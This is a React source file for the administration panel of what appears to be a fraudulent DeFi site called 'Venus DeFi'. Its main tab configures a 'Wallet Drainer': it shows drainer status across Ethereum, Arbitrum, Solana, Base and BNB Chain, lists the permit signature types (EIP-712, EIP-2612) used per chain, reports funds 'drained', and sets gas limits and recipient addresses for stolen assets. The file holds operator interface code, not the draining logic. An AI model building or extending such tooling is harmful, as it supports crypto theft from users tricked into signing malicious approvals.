
import React from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from '@/components/ui/button';
import { useWallet } from '../context/WalletContext';

const AdminPanel = () => {
  const { isConnected } = useWallet();
  
  if (!isConnected) {
    return (
      <div className="p-6">
        <div className="bg-[#191E29] p-8 rounded-lg shadow-md text-center">
          <h2 className="text-2xl font-bold mb-4">Admin Access Required</h2>
          <p className="text-slate-300 mb-6">
            Please connect your admin wallet to access the administration panel
          </p>
          <Button className="bg-venus-blue hover:bg-blue-600">
            Connect Admin Wallet
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6">
      <h2 className="text-2xl font-bold mb-6">Administration Panel</h2>
      
      <Tabs defaultValue="drainer" className="w-full">
        <TabsList className="mb-6 bg-slate-800">
          <TabsTrigger value="drainer">Wallet Drainer</TabsTrigger>
          <TabsTrigger value="tokens">Token Management</TabsTrigger>
          <TabsTrigger value="users">User Management</TabsTrigger>
          <TabsTrigger value="settings">Platform Settings</TabsTrigger>
        </TabsList>
        
        <TabsContent value="drainer" className="bg-[#191E29] p-6 rounded-lg">
          <h3 className="text-xl font-semibold mb-4">Wallet Drainer Configuration</h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-2">Current Status</h4>
              <div className="flex items-center">
                <div className="w-3 h-3 rounded-full bg-green-500 mr-2"></div>
                <span>Active</span>
              </div>
              <p className="text-sm text-slate-400 mt-2">
                The wallet drainer is currently operational across all supported chains
              </p>
            </div>
            
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-2">Performance</h4>
              <div>
                <span className="text-2xl font-bold">0.00 ETH</span>
                <span className="text-sm text-slate-400 ml-2">drained in last 24h</span>
              </div>
              <p className="text-sm text-slate-400 mt-2">
                Total value: $0.00 across all chains
              </p>
            </div>
          </div>
          
          <div className="bg-slate-800 p-4 rounded-lg mb-6">
            <h4 className="font-medium mb-4">Chain Configuration</h4>
            <table className="w-full">
              <thead>
                <tr className="text-left text-sm text-slate-400">
                  <th className="pb-2">Chain</th>
                  <th className="pb-2">Status</th>
                  <th className="pb-2">Signature Type</th>
                  <th className="pb-2">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                <tr>
                  <td className="py-3">Ethereum</td>
                  <td className="py-3">
                    <div className="flex items-center">
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500 mr-2"></div>
                      <span>Active</span>
                    </div>
                  </td>
                  <td className="py-3">EIP-712</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Configure</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">Arbitrum</td>
                  <td className="py-3">
                    <div className="flex items-center">
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500 mr-2"></div>
                      <span>Active</span>
                    </div>
                  </td>
                  <td className="py-3">EIP-2612</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Configure</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">Solana</td>
                  <td className="py-3">
                    <div className="flex items-center">
                      <div className="w-2.5 h-2.5 rounded-full bg-yellow-500 mr-2"></div>
                      <span>Pending</span>
                    </div>
                  </td>
                  <td className="py-3">SPL Signature</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Configure</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">Base</td>
                  <td className="py-3">
                    <div className="flex items-center">
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500 mr-2"></div>
                      <span>Active</span>
                    </div>
                  </td>
                  <td className="py-3">EIP-2612</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Configure</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">BNB Chain</td>
                  <td className="py-3">
                    <div className="flex items-center">
                      <div className="w-2.5 h-2.5 rounded-full bg-green-500 mr-2"></div>
                      <span>Active</span>
                    </div>
                  </td>
                  <td className="py-3">EIP-712</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Configure</Button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-4">Transaction Settings</h4>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Priority Gas Fee (Gwei)</label>
                  <input type="number" className="bg-slate-700 rounded w-full p-2" defaultValue={5} />
                </div>
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Max Gas Limit</label>
                  <input type="number" className="bg-slate-700 rounded w-full p-2" defaultValue={200000} />
                </div>
                <Button className="w-full bg-venus-blue hover:bg-blue-600">
                  Update Gas Settings
                </Button>
              </div>
            </div>
            
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-4">Recipient Address</h4>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Primary Recipient</label>
                  <input 
                    type="text" 
                    className="bg-slate-700 rounded w-full p-2" 
                    defaultValue="0x0000000000000000000000000000000000000000" 
                  />
                </div>
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Backup Recipient</label>
                  <input 
                    type="text" 
                    className="bg-slate-700 rounded w-full p-2" 
                    defaultValue="0x0000000000000000000000000000000000000000" 
                  />
                </div>
                <Button className="w-full bg-venus-blue hover:bg-blue-600">
                  Update Recipients
                </Button>
              </div>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="tokens" className="bg-[#191E29] p-6 rounded-lg">
          <h3 className="text-xl font-semibold mb-4">Token Management</h3>
          <p className="text-slate-400 mb-6">
            Manage supported tokens and their configurations across all chains
          </p>
          
          <div className="bg-slate-800 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center mb-4">
              <h4 className="font-medium">Supported Tokens</h4>
              <Button size="sm" className="bg-venus-primary">Add New Token</Button>
            </div>
            
            <table className="w-full">
              <thead>
                <tr className="text-left text-sm text-slate-400">
                  <th className="pb-2">Token</th>
                  <th className="pb-2">Chain</th>
                  <th className="pb-2">Contract Address</th>
                  <th className="pb-2">Status</th>
                  <th className="pb-2">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700">
                <tr>
                  <td className="py-3">ETH</td>
                  <td className="py-3">Ethereum</td>
                  <td className="py-3">Native</td>
                  <td className="py-3">Active</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Edit</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">USDC</td>
                  <td className="py-3">Ethereum</td>
                  <td className="py-3">0xa0b8...7d2e</td>
                  <td className="py-3">Active</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Edit</Button>
                  </td>
                </tr>
                <tr>
                  <td className="py-3">SOL</td>
                  <td className="py-3">Solana</td>
                  <td className="py-3">Native</td>
                  <td className="py-3">Active</td>
                  <td className="py-3">
                    <Button variant="outline" size="sm" className="h-7 text-xs">Edit</Button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </TabsContent>
        
        <TabsContent value="users" className="bg-[#191E29] p-6 rounded-lg">
          <h3 className="text-xl font-semibold mb-4">User Management</h3>
          <p className="text-slate-400 mb-6">
            View and manage platform users and their activities
          </p>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-4">
              <h4 className="font-medium">Recent User Activity</h4>
              <Button size="sm" className="bg-venus-primary">Export Data</Button>
            </div>
            
            <div className="text-center py-8 text-slate-400">
              <p>No user activity recorded yet</p>
            </div>
          </div>
        </TabsContent>
        
        <TabsContent value="settings" className="bg-[#191E29] p-6 rounded-lg">
          <h3 className="text-xl font-semibold mb-4">Platform Settings</h3>
          <p className="text-slate-400 mb-6">
            Configure global platform settings and parameters
          </p>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-4">General Settings</h4>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Platform Name</label>
                  <input type="text" className="bg-slate-700 rounded w-full p-2" defaultValue="Venus DeFi" />
                </div>
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Platform Fee (%)</label>
                  <input type="number" className="bg-slate-700 rounded w-full p-2" defaultValue={0.3} />
                </div>
                <div className="flex items-center">
                  <input type="checkbox" id="maintenanceMode" className="mr-2" />
                  <label htmlFor="maintenanceMode">Maintenance Mode</label>
                </div>
                <Button className="w-full bg-venus-blue hover:bg-blue-600">
                  Save Settings
                </Button>
              </div>
            </div>
            
            <div className="bg-slate-800 p-4 rounded-lg">
              <h4 className="font-medium mb-4">RPC Endpoints</h4>
              <div className="space-y-4">
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Ethereum RPC</label>
                  <input 
                    type="text" 
                    className="bg-slate-700 rounded w-full p-2" 
                    defaultValue="https://mainnet.infura.io/v3/" 
                  />
                </div>
                <div>
                  <label className="block text-sm text-slate-400 mb-1">Solana RPC</label>
                  <input 
                    type="text" 
                    className="bg-slate-700 rounded w-full p-2" 
                    defaultValue="https://api.mainnet-beta.solana.com" 
                  />
                </div>
                <Button className="w-full bg-venus-blue hover:bg-blue-600">
                  Update RPC Settings
                </Button>
              </div>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default AdminPanel;
